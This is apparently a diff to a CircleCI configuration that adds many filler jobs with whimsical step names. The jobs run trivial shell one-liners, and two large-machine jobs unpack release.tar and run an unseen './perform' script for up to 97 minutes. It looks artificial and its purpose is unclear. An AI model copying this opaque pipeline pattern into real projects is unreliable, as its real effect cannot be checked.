+  stepA_Rollout_Suite3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: yikes
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="encode me well"; cmd=""; for(i=1;i<=length(s);i++){c=substr(s,i,1); cmd=cmd c}; print cmd}'; true ; } > /tmp/data/phase-ready.out
+            len=$(wc -c </tmp/data/phase-ready.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - phase-ready.out
+  Rollout_Suite3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/phase-ready.out || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  gamma_min-push:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: beg for mercy
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; printf "%s\n" aa bb cc aa bb | sort | uniq -c | sort -rn; true ; } > /tmp/data/DONE
+            len=$(wc -c </tmp/data/DONE); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - DONE
+  min-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/DONE || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+
+  teardown_india_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: splish splash
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=7 2>/dev/null | gzip -9 | wc -c; true ; } > /tmp/data/15.bin
+            len=$(wc -c </tmp/data/15.bin); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 15.bin
+  hook_jul28-cleanup_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: lower volume
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; echo 'abcdefg' | sed -e 'y/abcde/ABCDE/'; true ; } > /tmp/data/67.data
+            len=$(wc -c </tmp/data/67.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 67.data
+  round1_deploy_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: cleat hitch
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=20; for(a=0;a<n;a++) for(b=0;b<n;b++) if((a+b)%7==0) c++; print c}'; true ; } > /tmp/data/step-pass.txt
+            len=$(wc -c </tmp/data/step-pass.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - step-pass.txt
+  dispatch_wip-edge-hang_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: matte dust
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; date -u +"%H:%M:%S.%N"; true ; } > /tmp/data/phase-ok.log
+            len=$(wc -c </tmp/data/phase-ok.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - phase-ok.log
+  canary_preview-v1_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: press decline
+          command: |
+            mkdir -p /tmp/data
+            set +o pipefail 2>/dev/null; date -u +%s%N > /tmp/data/checkpoint-B.pickle; for i in $(seq 1 5000); do echo "$i $(date +%N)" >> /tmp/data/checkpoint-B.pickle; done; true
+            len=$(wc -c </tmp/data/checkpoint-B.pickle); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - checkpoint-B.pickle
+  dispatch_Validate_Pipeline7_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: plank hold
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; echo "layered" | base64 | tr A-Za-z N-ZA-Mn-za-m | head -c 20; true ; } > /tmp/data/2023-11-15.data
+            len=$(wc -c </tmp/data/2023-11-15.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 2023-11-15.data
+workflows:
+  release:
+    jobs:
+      - canary1_india
+      - teardown_india_2:
+          requires:
+            - canary1_india
+      - india:
+          requires:
+            - teardown_india_2
+      - g2_jul28-cleanup:
+          requires:
+            - teardown_india_2
+      - hook_jul28-cleanup_2:
+          requires:
+            - g2_jul28-cleanup
+      - jul28-cleanup:
+          requires:
+            - hook_jul28-cleanup_2
+      - cook_deploy:
+          requires:
+            - hook_jul28-cleanup_2
+      - round1_deploy_2:
+          requires:
+            - cook_deploy
+      - deploy:
+          requires:
+            - round1_deploy_2
+      - reup_wip-edge-hang:
+          requires:
+            - round1_deploy_2
+      - dispatch_wip-edge-hang_2:
+          requires:
+            - reup_wip-edge-hang
+      - wip-edge-hang:
+          requires:
+            - dispatch_wip-edge-hang_2
+      - round1_preview-v1:
+          requires:
+            - dispatch_wip-edge-hang_2
+      - canary_preview-v1_2:
+          requires:
+            - round1_preview-v1
+      - preview-v1:
+          requires:
+            - canary_preview-v1_2
+      - fetch_Validate_Pipeline7:
+          requires:
+            - canary_preview-v1_2
+      - dispatch_Validate_Pipeline7_2:
+          requires:
+            - fetch_Validate_Pipeline7
+      - Validate_Pipeline7:
+          requires:
+            - dispatch_Validate_Pipeline7_2
+      - retry_update-session
+      - tester_ship-it
+      - update-session:
+          requires:
+            - retry_update-session
+            - tester_ship-it
+      - ship-it:
+          requires:
+            - retry_update-session
+            - tester_ship-it
+      - luna-ship:
+          requires:
+            - retry_update-session
+            - tester_ship-it
+      - nebula-rev:
+          requires:
+            - retry_update-session
+            - tester_ship-it
+      - dp-alt:
+          requires:
+            - retry_update-session
+            - tester_ship-it
+      - VerifyStaging:
+          requires:
+            - retry_update-session
+            - tester_ship-it
+      - pat-run:
+          requires:
+            - retry_update-session
+            - tester_ship-it
+      - rollout:
+          requires:
+            - retry_update-session
+            - tester_ship-it
+      - ensure_assemble-partial-artifact-bundle
+      - assemble-partial-artifact-bundle:
+          requires:
+            - ensure_assemble-partial-artifact-bundle
+      - package_t-01:
+          requires:
+            - ensure_assemble-partial-artifact-bundle
+      - t-01:
+          requires:
+            - package_t-01
+      - Beta_chore-1001:
+          requires:
+            - package_t-01
+      - chore-1001:
+          requires:
+            - Beta_chore-1001
+      - g2_fix-queue-redirect:
+          requires:
+            - Beta_chore-1001
+      - fix-queue-redirect:
+          requires:
+            - g2_fix-queue-redirect
+      - gamma_min-push:
+          requires:
+            - g2_fix-queue-redirect
+      - min-push:
+          requires:
+            - gamma_min-push
+      - stepA_Rollout_Suite3:
+          requires:
+            - gamma_min-push
+      - Rollout_Suite3:
+          requires:
+            - stepA_Rollout_Suite3
+      - validate_produce-production-regression-suite:
+          requires:
+            - stepA_Rollout_Suite3
+      - produce-production-regression-suite:
+          requires:
+            - validate_produce-production-regression-suite
+      - cacher_strated
+      - fetcher_polaris-plus
+      - route_verify-staging-artifact-bundle
+      - strated:
+          requires:
+            - cacher_strated
+            - fetcher_polaris-plus
+            - route_verify-staging-artifact-bundle
+      - polaris-plus:
+          requires:
+            - cacher_strated
+            - fetcher_polaris-plus
+            - route_verify-staging-artifact-bundle
+      - verify-staging-artifact-bundle:
+          requires:
+            - cacher_strated
+            - fetcher_polaris-plus
+            - route_verify-staging-artifact-bundle
+      - DEV_HOOK_1:
+          requires:
+            - cacher_strated
+            - fetcher_polaris-plus
+            - route_verify-staging-artifact-bundle
+      - wip-cache-leak:
+          requires:
+            - cacher_strated
+            - fetcher_polaris-plus
+            - route_verify-staging-artifact-bundle
+      - yankee-7:
+          requires:
+            - cacher_strated
+            - fetcher_polaris-plus
+            - route_verify-staging-artifact-bundle
+      - run-quick-release-candidate:
+          requires:
+            - cacher_strated
+            - fetcher_polaris-plus
+            - route_verify-staging-artifact-bundle
+      - teh-ci:
+          requires:
+            - cacher_strated
+            - fetcher_polaris-plus
+            - route_verify-staging-artifact-bundle
+      - cerberus-alpha:
+          requires:
+            - cacher_strated
+            - fetcher_polaris-plus
+            - route_verify-staging-artifact-bundle
